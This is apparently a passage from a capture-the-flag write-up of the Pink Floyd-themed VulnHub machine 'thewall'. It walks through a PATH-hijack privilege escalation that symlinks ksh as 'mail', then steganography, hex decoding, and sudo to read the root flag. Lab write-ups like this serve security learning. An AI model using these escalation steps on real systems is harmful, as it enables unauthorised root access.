$ strings /usr/local/bin/shineon                                                                                                                                                                                                       
/usr/libexec/ld.so
OpenBSD
OpenBSD
libc.so.80.1
printf
__stack_smash_handler
__srget
getc
puts
system
_thread_atfork
environ
__progname
__cxa_atexit
__sF
__isthreaded
scanf
_Jv_RegisterClasses
__got_start
__got_end
__data_start
_edata
__bss_start
__progname_storage
__fini
__init_tcb
QRP1
[^_]
Menu
1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
Quitting program!
Invalid choice!
load_menu
Time - The Dark Side of the Moon
/usr/bin/cal
Press ENTER to continue.
Echoes - Meddle
/usr/bin/who
Is There Anybody Out There? - The Wall
/sbin/ping -c 3 www.google.com
Keep Talking- The Division Bell
mail
```

While other executables have full path, mail does not have. That means, we can potentially specify the path in such a way that we can execute our own executable before the actual mail executable is executed.

```shell
$ echo $PATH
/home/RichardWright/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/X11R6/bin:/usr/local/bin:/usr/local/sbin:/usr/games:.

$ ln -s /bin/ksh /tmp/mail

$ export PATH=/tmp:$PATH

$ shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
mail: Cannot determine current working directory
$ whoami
DavidGilmour
```

This is perfect. We're now DavidGilmour. I believe we are very near here and I play some more shell game.

```shell
$ cat anotherbrick.txt                                                                                                                                                                                                                 
# Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond

New website for review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php

# You have to be trusted by the people you lie to. So that when they turn their backs on you, you'll get the chance to put the knife in. - Pink Floyd, Dogs
$ cat bio.txt
"David Jon Gilmour, CBE (born 6 March 1946), is an English musician, singer, songwriter and multi-instrumentalist. In a career spanning more than 50 years, he is best known[1] for his work as the guitarist and co-lead vocalist of the progressive rock band Pink Floyd. It was estimated that by 2012 the group had sold over 250 million records worldwide, including 75 million units sold in the United States.[2]

In addition to his work with Pink Floyd, Gilmour has produced a variety of artists, for example the Dream Academy, and has had a solo career. In 2005, Gilmour was made a Commander of the Order of the British Empire (CBE) for his services to music.[3] He was awarded with the Outstanding Contribution title at the 2008 Q Awards.[4] In 2011, Rolling Stone magazine ranked him number 14 in their list of the greatest guitarists of all time. Additionally, Gilmour was voted number 36 in the greatest voices in rock by Planet Rock listeners in 2009."

Source: Wikipedia (https://en.wikipedia.org/wiki/David_Gilmour)
$ cat mbox
From RichardWright@thewall.localdomain Tue Oct 27 01:41:18 2015
Return-Path: RichardWright@thewall.localdomain
Delivered-To: DavidGilmour@thewall.localdomain
Received: from localhost (thewall.localdomain [local])
        by thewall.localdomain (OpenSMTPD) with ESMTPA id 3ad74b19
        for <DavidGilmour@thewall.localdomain>;
        Tue, 27 Oct 2015 01:41:18 +1000 (AEST)
From: Richard Wright <RichardWright@thewall.localdomain>
Date: Tue, 27 Oct 2015 01:41:18 +1000 (AEST)
Message-Id: <4059885549097245741.enqueue@thewall.localdomain>
To: DavidGilmour@thewall.localdomain
Subject: Brain Damage
Status: RO

Hey Dave,
I feel like we're back in the studio for The Dark Side of the Moon.
Sorry to keep bugging you, but can you tell me again how to do things
when I'm on thewall.
Rick

$ ls -liah .private/
total 8
24597 drwx------  2 DavidGilmour  DavidGilmour   512B Oct 26 11:44 .
24585 drwx------  4 DavidGilmour  DavidGilmour   512B Oct 28 09:28 ..

$ chmod a+r /tmp/david_gilmour_profile_pic.jpg
```

Visiting http://192.168.168.39/pinkfloyd1965newblogsite50yearscelebration-temp/index.php gives us a new site. Trying file inclusion based on the page variable didn't work but I also had gotten the profile picture of David and turns out it was an image but exif analysis gave error unlike other images.

![David Gilmour](images/david_gilmour_profile_pic.jpg "David Gilmour")

```shell
$ exif david_gilmour_profile_pic.jpg
Corrupt data
The data provided does not follow the specification.
ExifLoader: The data supplied does not seem to contain EXIF data.

$ strings david_gilmour_profile_pic.jpg | grep '.\{6\}'
---redacted---
who_are_you_and_who_am_i
```

However, I could not figure anything from the image anyway. But the output of strings was interesting esp. the string `who_are_you_and_who_am_i`. Quick view of the html source of homepage revealed HTML comment as below:

`Through the window in the wall, come streaming in on sunlight wings, a million bright ambassadors of morning. - Pink Floyd, Echoes
Can you see what the Dog sees? Perhaps hints of lightness streaming in on sunlight wings?`

I also saw two images and having had to play with steganography on this same challenge, I suspected this might be something in the same line. After playing a while with light levels and brightness, it did reveal some secrets in the home page image.

![Homepage Img](images/homepage_modified.gif "Homepage Img")

Zooming in and checking the texts, it suggested a path `/welcometothemachine` and some sort of hash: `50696e6b466c6f796435305965617273`. The hash is 32 characters long suggesting it must be MD5 hash. That's good but trying to crack with several online services does not give any result. :(

I started setting up oclhashcat and in the meantime, I thought if it was some text encoded in hex. I went to my own [encoder decoder](http://nepali.netau.net/enc_dec/) and boom! It gave the text: `PinkFloyd50Years`. Trying to load `http://192.168.168.39/welcometothemachine/` gave me 403 Forbidden but since I had shell, I could try searching for this directory on the server itself. I knew there was a `/var/www` directory but `htdocs` was not accessible. I then went ahead with trying the previously found string `who_are_you_and_who_am_i` as the password for DavidGilmour and that worked :D

```shell
$ su DavidGilmour
Password:
$ whoami
DavidGilmour
$ cd /var/www/htdocs/
$ ls -liah
total 244
51520 drwxr-x---   4 www   welcometothemachine   512B Nov 27 01:47 .
51510 drwxr-xr-x  11 root  daemon                512B Oct 27 03:35 ..
52890 -rw-r--r--   1 www   www                   539B Oct 25 01:20 index.html
51518 -rw-r--r--   1 www   www                   112K Oct 25 01:16 pink_floyd.jpg
53142 drwxr-xr-x   7 www   www                   512B Aug  8  2015 pinkfloyd1965newblogsite50yearscelebration-temp
53069 drwxr-xr-x   2 root  welcometothemachine   512B Aug  8  2015 welcometothemachine
$ ls -liah welcometothemachine/
total 24
53069 drwxr-xr-x  2 root  welcometothemachine   512B Aug  8  2015 .
51520 drwxr-x---  4 www   welcometothemachine   512B Nov 27 01:47 ..
53071 -rws--s---  1 root  welcometothemachine   7.3K Nov 27 01:47 PinkFloyd
```

Well, one more binary with setuid bit? Cool! But, we are `DavidGilmour` right now. Lets see which users are in `welcometothemachine` user group.

```shell
$ grep "welcometothemachine" /etc/group
welcometothemachine:*:1005:DavidGilmour
```

Cool, we're in the group. So, lets try to run this thing then.

```shell
$ ./PinkFloyd
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: PinkFloyd50Years

$ ./PinkFloyd
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: Brain Damage

Denied....
If I had my way, I'd have all of ya shot. - Pink Floyd, In The Flesh
```

I tried couple more answers but I could not find my way through this. I also checked the files in `/var/www/htdocs` but nothing interesting or new.

Oh well maybe the hex string itself might be the password. I tried `PinkFloyd50Years` but not its hex. This didn't trigger me immediately though.

```shell
$ ./PinkFloyd                                                                                                                                                                                                                          
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: 50696e6b466c6f796435305965617273

Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless

Congratulations... permission has been granted.
You can now set your controls to the heart of the sun!

$ whoami
DavidGilmour
$ sudo su
Password:
# cd /root/
# ls
.Xdefaults .cshrc     .cvsrc     .login     .profile   .ssh       flag.txt   scripts    tmp
# cat flag.txt

"The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar"

                   Congratulations on rooting thewall!

   ___________________________________________________________________
  | |       |       |       |       |       |       |       |       | |
  |_|_______|_______|______ '__  ___|_______|_______|_______|_______|_|
  |     |       |       |   |  )      /         |       |       |     |
  |_____|_______|_______|__ |,' , .  | | _ , ___|_______|_______|_____|
  | |       |       |      ,|   | |\ | | ,' |       |       |       | |
  |_|_______|_______|____ ' | _ | | \| |'\ _|_______|_______|_______|_|
  |     |       |       |   \  _' '  ` |  \     |       |       |     |
  |_____|_______|_______|_  ,-'_ _____ | _______|_______|_______|_____|
  | |       |       |   ,-'|  _     |       |       |       |       | |
  |_|_______|_______|__  ,-|-' |  ,-. \ /_.--. _____|_______|_______|_|
  |     |       |          |   |  | |  V  |   ) |       |       |     |
  |_____|_______|_______|_ | _ |-'`-'  |  | ,' _|_______|_______|_____|
  | |       |       |      |        |  '  ;'        |       |       | |
  |_|_______|_______|______"|_____  _,- o'__|_______|_______|_______|_|
  |     |       |       |       _,-'    .       |       |       |     |
  |_____|_______|_______|_ _,--'\      _,-'_____|_______|_______|_____|
  | |       |       |     '     ||_||-' _   |       |       |       | |
  |_|_______|_______|_______|__ || ||,-'  __|_______|_______|_______|_|
  |     |       |       |       |  ||_,-'       |       |       |     |
  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|
  | |       |       |   \    |     /        |       |       |       | |
  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|
  |     |       |       | \      // \   |   |   |       |       |     |
  |_____|_______|_______|_ \ /\ //--'\  |   | __|_______|_______|_____|
  | |       |       |       '  V/    |  |-' |__,    |       |       | |
  |_|_______|_______|_______|_______ _______'_______|_______|_______|_|
  |     |       |       |       |       |       |       |       |     |
  |_____|_______|_______|_______|_______|_______|_______|_______|_____|
  |_________|_______|_______|_______|_______|_______|_______|_______|_|

                  Celebrating 50 years of Pink Floyd!
             Syd Barrett (RIP), Nick Mason, Roger Waters,
               Richard Wright (RIP), and David Gilmour.


** Shoutouts **
+ @vulnhub for making it all possible
+ @rastamouse @thecolonial - "the test bunnies"

-=========================================-
-  xerubus (@xerubus - www.mogozobo.com)  -
-=========================================-
```

Initially, I thought the result was the root access but it seemed I got sudo access for the user `DavidGilmour` and it turned out to be true.

After getting the flag and root access, I browsed through /root/scripts directory and saw how things were put together. This was the most fun CTF so far because there were times when I was challenged and had to refresh my brain a lot.

Game Over!
